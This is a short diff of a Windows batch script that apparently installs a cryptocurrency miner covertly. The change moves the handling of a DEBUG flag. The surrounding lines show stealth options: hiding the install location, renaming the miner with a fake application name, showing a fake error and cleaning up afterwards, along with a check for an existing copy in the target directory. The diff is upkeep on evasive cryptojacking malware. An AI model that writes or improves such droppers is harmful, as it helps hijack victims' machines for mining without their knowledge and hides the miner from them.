@@ -153,7 +153,6 @@ IF "%HIDELOCATION%" EQU "YES" (SET "HIDELOCATION=1") ELSE (SET "HIDELOCATION=0")
 IF "%MINEREXTRAS%" EQU "YES" (SET "MINEREXTRAS=1") ELSE (SET "MINEREXTRAS=0")
 IF "%FAKEAPP%" EQU "YES" (SET "FAKEAPP=1") ELSE (SET "FAKEAPP=0")
 IF "%CLEANUP%" EQU "YES" (SET "CLEANUP=1") ELSE (SET "CLEANUP=0")
-IF "%DEBUG%" EQU "YES" (SET "DEBUG=1") ELSE (SET "DEBUG=0")
 IF "%FAKEERROR%" EQU "YES" (SET "FAKEERROR=1") ELSE (SET "FAKEERROR=0")
 REM Detect which name to use for the Miners Application Name..
 IF "%FAKEAPP%" EQU "1" (SET "MINER=%FAKENAME%") ELSE (SET "MINER=%ORIGMINER%")
@@ -207,6 +206,8 @@ REM +------------------------+
 REM |    Debugging Options   |
 REM +------------------------+
 SET "DEBUG=NO"
+REM Debug Variable Helper.
+IF "%DEBUG%" EQU "YES" (SET "DEBUG=1") ELSE (SET "DEBUG=0")
 
 REM Finally after all that craziness.. Time for THIS craziness..
 IF EXIST "%TARGETDIR%\%MINER%" (GOTO 0) ELSE (GOTO 1)
